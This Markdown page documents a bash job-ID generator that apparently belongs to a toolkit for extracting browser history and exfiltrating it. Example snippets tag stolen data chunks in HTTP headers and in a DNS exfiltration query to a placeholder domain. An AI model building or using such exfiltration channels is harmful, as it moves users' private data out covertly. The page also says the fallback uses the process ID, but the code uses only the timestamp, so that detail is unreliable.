# Generate Job ID Function

## Overview
The `core_generate_job_id()` function creates a unique 8-character hexadecimal identifier for tracking script execution across logging, exfiltration, and debugging operations.

## Function Signature
```bash
core_generate_job_id()
```

## Parameters
- **Inputs**: None
- **Outputs**: 8-character hexadecimal job ID (e.g., "a1b2c3d4")
- **Logic**: None

## Implementation
```bash
# Purpose: Generate a unique job ID for tracking script execution
# Inputs: None
# Outputs: 8-character hexadecimal job ID
# - None
core_generate_job_id() {
    # Use openssl to generate random hex string for job tracking
    # Fallback to date-based ID if openssl not available
    if command -v "$CMD_OPENSSL" > /dev/null 2>&1; then
        $CMD_OPENSSL rand -hex 4 2>/dev/null || {
            # Fallback: use timestamp and process ID
            $CMD_PRINTF "%08x" "$(($(date +%s) % 4294967296))"
        }
    else
        # Fallback: use timestamp and process ID
        $CMD_PRINTF "%08x" "$(($(date +%s) % 4294967296))"
    fi
}
```

## Usage Examples

### Basic Usage
```bash
# Generate a job ID at script startup
JOB_ID=$(core_generate_job_id)
echo "Job ID: $JOB_ID"
# Output: Job ID: a1b2c3d4
```

### In Logging Context
```bash
# Used in log entries for correlation
core_log_output "Starting browser history extraction" "info" false
# Log entry includes: [job:a1b2c3d4] ...
```

### In Exfiltration Context
```bash
# Used to correlate exfiltrated data chunks
core_exfiltrate_data "$output_data"
# HTTP headers include: X-Job-ID: a1b2c3d4
```

## Fallback Behavior

### Primary Method
- Uses `openssl rand -hex 4` for cryptographically secure random generation
- Produces true random 8-character hex strings

### Fallback Method
- Uses timestamp-based generation when OpenSSL unavailable
- Formula: `printf "%08x" "$(($(date +%s) % 4294967296))"`
- Still provides unique IDs based on execution time

## Integration Points

### Global Variable Assignment
```bash
# At script initialization in base.sh
JOB_ID=$(core_generate_job_id)
```

### Logging Integration
```bash
# Used in core_log_output function
printf "[job:%s] %s\n" "$JOB_ID" "$message"
```

### Exfiltration Integration
```bash
# HTTP headers
-H "X-Job-ID: $JOB_ID"

# DNS queries
dig "data-$JOB_ID.example.com"
```

## Security Considerations

### Randomness Quality
- Primary method uses OpenSSL's cryptographically secure random generator
- Fallback method provides time-based uniqueness (not cryptographically secure)
- 8-character hex provides 4.3 billion possible values

### Information Disclosure
- Job IDs are transmitted in logs and exfiltration
- Consider operational security when using in sensitive environments
- IDs help correlate activities but may reveal script execution patterns

## Dependencies
- **Required**: `date` command (POSIX standard)
- **Optional**: `openssl` command (for secure random generation)
- **Variables**: `$CMD_OPENSSL`, `$CMD_PRINTF`

## Error Handling
- Graceful fallback when OpenSSL unavailable
- No error conditions - always returns valid 8-character hex string
- Silent fallback maintains script execution flow

## Performance
- **Primary**: ~5ms (OpenSSL execution)
- **Fallback**: ~1ms (date calculation)
- **Memory**: Minimal (single function call)
- **Network**: None

## Testing
```bash
# Test primary method
if command -v openssl > /dev/null 2>&1; then
    job_id=$(core_generate_job_id)
    echo "Generated: $job_id"
    # Should output 8 hex characters
fi

# Test fallback method
CMD_OPENSSL="/nonexistent/openssl"
job_id=$(core_generate_job_id)
echo "Fallback: $job_id"
# Should output 8 hex characters based on timestamp
``` 